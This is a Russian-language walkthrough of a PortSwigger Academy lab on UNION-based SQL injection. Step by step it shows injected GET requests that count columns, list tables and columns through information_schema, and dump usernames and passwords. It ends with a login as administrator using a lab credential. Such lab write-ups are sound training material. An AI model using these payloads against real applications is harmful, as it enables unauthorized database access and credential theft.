Зайдем на предложенный уязвимый ресурс, и перейдем в любую категорию. Найдем данный запрос в `Proxy` ->`HTTP history` и отправим его в `Repeater`
```
GET /filter?category=Pets
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/17.%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20non-Oracle%20databases/pics%20for%20walktrough/1.png)
Проверим, что SQLi существует и уберем значение фильтра категории чтобы не мешалась
```
GET /filter?category='--
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/17.%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20non-Oracle%20databases/pics%20for%20walktrough/2.png)
Пользуясь конструкцией `UNION SELECT NULL,...,NULL` определяем сколько столбцов в возвращаемой таблице. В нашем случае - их две.
```
GET /filter?category='UNION+SELECT+NULL,NULL--
```
Далее убедимся, что мы правильно поняли структуру базы данных, и что `information_schema` существует
```
GET /filter?category='UNION+SELECT+NULL,NULL+FROM+information_schema.tables--
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/17.%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20non-Oracle%20databases/pics%20for%20walktrough/3.png)
выведем список всех таблиц 
```
GET /filter?category='UNION+SELECT+table_name,NULL+FROM+information_schema.tables-- 
```
Видим выбивающуюся из стандартных именований таблиц -  `users_sufuik`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/17.%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20non-Oracle%20databases/pics%20for%20walktrough/4.png)
Посмотрим что внутри
```
'UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_sufuik'--
```
А внутри там 2 поля - `username_suciha` и `password_ijlhqo`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/17.%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20non-Oracle%20databases/pics%20for%20walktrough/5.png)

Далее выполним запрос, позволяющий нам узнать что содержится в `username_suciha`
```
GET /filter?category='UNION+SELECT+username_suciha,NULL+FROM+users_sufuik--
```
В ответ получаем пользователей исследуемого приложения
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/17.%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20non-Oracle%20databases/pics%20for%20walktrough/6.png)
Следующим шагом обратимся к паролям 
```
GET /filter?category='UNION+SELECT+password_ijlhqo,NULL+FROM+users_sufuik--
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/17.%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20non-Oracle%20databases/pics%20for%20walktrough/7.png)
И на финальном этапе, зная логины и пароли пользователей приложения логинимся под `administrator:glfonprg9ixtgxzj6zsp` и получаем сообщение об успешно выполненной лабораторной атаке
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/17.%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20non-Oracle%20databases/pics%20for%20walktrough/8.png)
